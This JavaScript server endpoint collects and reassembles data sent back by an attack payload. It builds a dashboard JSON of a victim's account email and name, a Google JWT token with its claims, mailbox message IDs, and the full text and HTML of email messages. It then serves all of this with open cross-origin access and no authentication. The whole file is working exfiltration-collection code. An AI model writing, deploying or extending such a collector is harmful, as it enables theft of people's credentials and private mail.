/* Everything the dashboard needs, already reassembled.
 *
 * GET /api/data            -> JSON
 * GET /api/data?clear=1    -> wipe the capture first (call this before a run)
 *
 * Assembly mirrors the local collector: the payload sends small labelled beacons and one final
 * report carrying a `messages` array; the best report-shaped beacon wins, and the individual
 * message beacons are used as a fallback.
 */

const { readAll, clearAll, useKV } = require('../lib/store');

const asStr = (v) => (v === undefined || v === null ? null : String(v));

function build(beacons) {
  const out = {
    storage: useKV ? 'vercel-kv' : 'memory',
    count: beacons.length,
    first: beacons.length ? beacons[0].t : null,
    last: beacons.length ? beacons[beacons.length - 1].t : null,
    account_email: null, account_name: null, account_raw: null,
    token: null, token_len: null, claims: null,
    index_bytes: null, ids: null, ids_top: [], probes: [], errors: [],
    messages: [], progress: [],
  };

  // pick the most complete report-shaped beacon
  let best = null;
  let bestScore = -1;
  beacons.forEach((b, i) => {
    const d = b.body;
    if (!d || typeof d !== 'object' || !Array.isArray(d.messages)) return;
    const score = d.messages.length * 1000 + (d.account ? 100 : 0)
      + (d.google_token ? 100 : 0) + (d.mailbox ? 1 : 0) * 1 + i / 1000;
    if (score > bestScore) { bestScore = score; best = d; }
  });

  if (best) {
    const a = best.account || {};
    out.account_email = asStr(a.email);
    out.account_name = asStr(a.name);
    out.account_raw = asStr(a.raw);
    const t = best.google_token || {};
    out.token = asStr(t.jwt);
    out.token_len = t.len || (t.jwt ? t.jwt.length : null);
    out.claims = t.claims || null;
    const m = best.mailbox || {};
    out.index_bytes = m.index_bytes;
    out.ids = m.ids_count;
    out.ids_top = m.ids_top || [];
    out.probes = best.probes || [];
    out.errors = best.errors || [];
    out.device = best.device || null;
    out.messages = best.messages.map((x) => ({
      rank: x.rank, sid: x.sid, len: x.len, text: x.text || '', html: x.html || '',
    }));
  } else {
    // fall back to the individual beacons
    const byRank = {};
    beacons.forEach((b) => {
      const d = b.body;
      if (!d || typeof d !== 'object') return;
      if (d.step === 'account') out.account_email = asStr(d.email);
      if (d.step === 'google_token') out.token_len = d.len;
      if (d.step === 'index') out.ids = d.ids;
      if (d.step === 'message') byRank[d.rank] = { rank: d.rank, sid: d.sid, len: d.len,
                                                   text: d.text || '', html: d.html || '' };
    });
    out.messages = Object.keys(byRank).sort().map((k) => byRank[k]);
  }

  out.progress = beacons
    .filter((b) => b.body && typeof b.body === 'object' && b.body.step
      && b.body.step !== 'message')
    .map((b) => ({ t: b.t, step: b.body.step, detail: b.body }));

  return out;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Cache-Control', 'no-store');
  const q = req.query || {};
  if (q.clear) { try { await clearAll(); } catch (e) { /* ignore */ } }
  let beacons = [];
  try { beacons = (await readAll()).map((s) => { try { return JSON.parse(s); } catch (e) { return null; } })
    .filter(Boolean); } catch (e) { /* ignore */ }
  res.setHeader('Content-Type', 'application/json');
  res.statusCode = 200;
  res.end(JSON.stringify(build(beacons), null, 2));
};
